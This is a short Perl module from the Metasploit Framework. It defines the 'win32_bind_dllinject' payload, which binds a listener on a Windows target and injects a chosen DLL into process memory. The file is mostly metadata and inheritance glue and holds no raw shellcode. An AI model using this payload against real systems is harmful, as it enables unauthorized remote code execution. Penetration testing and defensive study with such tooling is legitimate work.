package Msf::Payload::win32_bind_dllinject;
use strict;
use base 'Msf::PayloadComponent::Win32InjectLibStage';
sub load {
  Msf::PayloadComponent::Win32InjectLibStage->import('Msf::PayloadComponent::Win32BindStager');
}

my $info =
{
  'Name'         => 'winbind_dllinject',
  'Version'      => '$Revision$',
  'Description'  => 'Listen for connection and inject DLL into process memory',
  'Authors'      => [
                        'Jarkko Turkulainen <jt@klake.org> [Unknown License]',
                        'Matt Miller <mmiller@hick.org> [Unknown License]'
                    ],
  'UserOpts'     => { 'DLL' => [1, 'PATH', 'The full path the DLL that should be injected'] },
                
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub _InjectDLL {
  my $self = shift;
  return $self->GetVar('DLL');
}

1;
